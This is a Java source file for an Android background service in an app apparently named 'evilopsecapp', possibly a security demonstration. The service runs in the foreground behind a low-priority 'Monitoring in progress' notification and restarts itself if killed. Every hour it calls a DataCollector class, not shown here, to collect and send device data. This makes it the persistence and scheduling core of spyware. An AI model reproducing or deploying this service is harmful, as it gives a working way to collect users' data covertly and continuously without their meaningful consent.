package com.example.evilopsecapp.datacollection;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.util.Timer;
import java.util.TimerTask;

public class BackgroundCollectorService extends Service {
    private static final String TAG = "BackgroundCollector";
    private static final String CHANNEL_ID = "CollectorServiceChannel";
    private static final int INTERVAL = 3600000; // 1 hour (adjust as needed)

    private Timer timer;
    private DataCollector dataCollector;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "BackgroundCollectorService created...");

        dataCollector = new DataCollector(this);
        createNotificationChannel();
        startForeground(1, getNotification());
        startDataCollection();
    }

    private void startDataCollection() {
        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.d(TAG, "Collecting and sending data...");
                dataCollector.collectAndSendData();
            }
        }, 0, INTERVAL);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Ensures service restarts if killed
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        Log.d(TAG, "Service destroyed, stopping data collection.");
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Evil WebView")
                .setContentText("Monitoring in progress...")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Data Collection Service",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not binding to any activity
    }
}
